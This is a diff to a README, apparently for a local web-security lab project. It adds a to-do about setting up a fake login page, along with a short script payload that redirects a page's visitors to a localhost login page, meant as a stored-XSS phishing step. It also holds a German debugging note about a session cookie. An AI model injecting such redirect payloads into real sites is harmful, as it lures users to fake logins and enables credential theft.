@@ -17,7 +17,15 @@ Installation and execution see README.md in corresponding subfolders
 ### Access to sensitive Information in sessions
 `./sessions/`
 
-[-] TODO Stored xss for session hijacking 
+[-] TODO Setup fake login and redirect to info to own server
+```
+<script>
+window.location.replace("http://localhost/loginpage/LoginPage.htm");
+</script>
+```
+
+[-] Warum AMCV gesetzt, kommt nicht von Docker rein, kommt von Node rein, sessions in node code anschauen, an Parametern liegt es nicht.
+
 
 ### HTTP Requests
 - With arbitrary content to arbitrary destinations
